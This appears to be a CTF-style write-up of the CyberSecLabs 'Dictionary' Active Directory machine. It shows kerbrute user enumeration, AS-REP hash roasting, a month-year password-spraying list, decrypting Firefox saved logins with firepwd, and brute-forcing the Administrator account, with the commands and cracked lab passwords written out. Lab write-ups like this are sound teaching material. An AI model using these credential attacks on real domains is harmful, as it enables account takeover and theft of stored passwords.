---
title: "CyberSecLabs - Dictionary"
tags: [windows,medium]
categories: CyberSecLabs-Active-Directory
---

⇒ Dictionary is an medium active directory machine that teaches us about :

- Kerbruting with wordlist to find valid users
- Kerberoasting
- Password Spraying with custom passlist
- Retrieving passwords from firefox credentials file

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Dictionary%20Machine%20ccb78796ba984a3595b4114196aad5ba/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Dictionary%20Machine%20ccb78796ba984a3595b4114196aad5ba/Untitled.png)

---

## NMAP

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Dictionary%20Machine%20ccb78796ba984a3595b4114196aad5ba/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Dictionary%20Machine%20ccb78796ba984a3595b4114196aad5ba/Untitled%201.png)

---

### Enumerating Valid Users and Kerberoasting

⇒ So after enumerating smb and ldap we didn't find anything so we decided to run kerbrute with seclist username wordlist to find valid users on the domain which we might be able to kerberoast.

Wordlist : [https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt)

- Running kerbrute to find valid users. We find an valid user named **izabel**.

**./kerbrute_linux_amd64 userenum -d Dictionary.csl --dc 172.31.3.4 names.txt**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Dictionary%20Machine%20ccb78796ba984a3595b4114196aad5ba/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Dictionary%20Machine%20ccb78796ba984a3595b4114196aad5ba/Untitled%202.png)

- Kerberoasting using GetNPUsers then cracking the hash to get password :

**python3 [GetNPUsers.py](http://getnpusers.py/) -dc-ip 172.31.3.4 Dictionary.csl/ -usersfile valid_users.txt**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Dictionary%20Machine%20ccb78796ba984a3595b4114196aad5ba/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Dictionary%20Machine%20ccb78796ba984a3595b4114196aad5ba/Untitled%203.png)

**izabel : June2013**

---

### Password Spraying

⇒ We still can't evil-winrm as user izabel to the machine. Enumerating RPC we find more users on the machine 

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Dictionary%20Machine%20ccb78796ba984a3595b4114196aad5ba/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Dictionary%20Machine%20ccb78796ba984a3595b4114196aad5ba/Untitled%204.png)

⇒ We previously saw what the password for izabel was **MONTHYEAR** so there's a possibility other users might have passwords like this. ****So we will make a password list something like that and password spray all these new users we have found

- Our wordlist :

```powershell
January2010
January2011
January2012
January2013
January2014
January2015
January2016
January2017
January2018
January2019
January2020
February2010
February2011
February2012
February2013
February2014
February2015
February2016
February2017
February2018
February2019
February2020
March2010
March2011
March2012
March2013
March2014
March2015
March2016
March2017
March2018
March2019
March2020
April2010
April2011
April2012
April2013
April2014
April2015
April2016
April2017
April2018
April2019
April2020
May2010
May2011
May2012
May2013
May2014
May2015
May2016
May2017
May2018
May2019
May2020
June2010
June2011
June2012
June2013
June2014
June2015
June2016
June2017
June2018
June2019
June2020
July2010
July2011
July2012
July2013
July2014
July2015
July2016
July2017
July2018
July2019
July2020
August2010
August2011
August2012
August2013
August2014
August2015
August2016
August2017
August2018
August2019
August2020
September2010
September2011
September2012
September2013
September2014
September2015
September2016
September2017
September2018
September2019
September2020
October2010
October2011
October2012
October2013
October2014
October2015
October2016
October2017
October2018
October2019
October2020
November2010
November2011
November2012
November2013
November2014
November2015
November2016
November2017
November2018
November2019
November2020
December2010
December2011
December2012
December2013
December2014
December2015
December2016
December2017
December2018
December2019
December2020
```

⇒ After password spraying we found the password for user Backup-Izabel. Then we connected to the machine using evil-winrm as user Backup-Izabel.

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Dictionary%20Machine%20ccb78796ba984a3595b4114196aad5ba/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Dictionary%20Machine%20ccb78796ba984a3595b4114196aad5ba/Untitled%205.png)

**BACKUP-Izabel:October2019**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Dictionary%20Machine%20ccb78796ba984a3595b4114196aad5ba/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Dictionary%20Machine%20ccb78796ba984a3595b4114196aad5ba/Untitled%206.png)

---

### Privilege Escalation to Domain Admin [ Firefox Login ]

⇒ So after running winpeas we discover that there's firefox credentials file which we can read

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Dictionary%20Machine%20ccb78796ba984a3595b4114196aad5ba/Untitled%207.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Dictionary%20Machine%20ccb78796ba984a3595b4114196aad5ba/Untitled%207.png)

⇒ We downloaded the files key4.db and logins.json . Then we'll be decrypting them using a tool named **firepwd**

Tool : [https://github.com/lclevy/firepwd](https://github.com/lclevy/firepwd)

- Running the tool :

**python3 firepwd.py key4.db logins.json**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Dictionary%20Machine%20ccb78796ba984a3595b4114196aad5ba/Untitled%208.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Dictionary%20Machine%20ccb78796ba984a3595b4114196aad5ba/Untitled%208.png)

⇒ Bruteforced administrator user with these passwords and found valid credentials. Then we logged in as Administrator user :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Dictionary%20Machine%20ccb78796ba984a3595b4114196aad5ba/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Dictionary%20Machine%20ccb78796ba984a3595b4114196aad5ba/Untitled%209.png)

**Administrator : kC7pbrQAsTT**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Dictionary%20Machine%20ccb78796ba984a3595b4114196aad5ba/Untitled%2010.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Dictionary%20Machine%20ccb78796ba984a3595b4114196aad5ba/Untitled%2010.png)

---
